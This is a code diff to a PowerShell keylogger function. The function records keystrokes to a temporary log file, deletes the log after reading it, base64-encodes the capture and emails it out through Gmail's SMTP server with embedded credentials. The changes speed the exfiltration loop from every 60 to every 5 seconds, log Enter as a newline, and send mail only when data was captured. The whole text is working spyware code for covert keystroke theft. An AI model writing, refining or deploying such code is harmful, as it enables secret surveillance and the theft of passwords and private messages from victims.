@@ -102,7 +102,7 @@ function script:Keylogger
 		$filename = "$env:temp\key.log"
         while($true) 
         { 
-            Start-Sleep -Seconds 60
+            Start-Sleep -Seconds 5
 			
 			$data = Get-Content $filename
 			Remove-Item -path $filename
@@ -211,7 +211,7 @@ function script:Keylogger
 					46 {$out = $out + "Delete"}
 					8 {$out = $out + "Backspace"}
 					32 {$out = $out + " "}
-					13 {$out = $out + "Enter"}
+					13 {$out = $out + "\n"}
 				}
 			}
 			
@@ -244,17 +244,20 @@ function script:Keylogger
                 $code = [Convert]::ToBase64String($ms.ToArray())
                 return $code
             }
-
-            $smtpserver = "smtp.gmail.com"
-			$msg = new-object Net.Mail.MailMessage
-			$smtp = new-object Net.Mail.SmtpClient($smtpServer, 587)
-			$smtp.EnableSsl = $True
-			$smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
-			$msg.From = "$username@gmail.com"
-			$msg.To.Add("$username@gmail.com")
-			$msg.Subject = $pastename
-			$msg.Body = $pastevalue
-			$smtp.Send($msg)
+			
+			if ($pastevalue)
+			{
+				$smtpserver = "smtp.gmail.com"
+				$msg = new-object Net.Mail.MailMessage
+				$smtp = new-object Net.Mail.SmtpClient($smtpServer, 587)
+				$smtp.EnableSsl = $True
+				$smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+				$msg.From = "$username@gmail.com"
+				$msg.To.Add("$username@gmail.com")
+				$msg.Subject = $pastename
+				$msg.Body = $pastevalue
+				$smtp.Send($msg)
+			}
         }
     }
 }
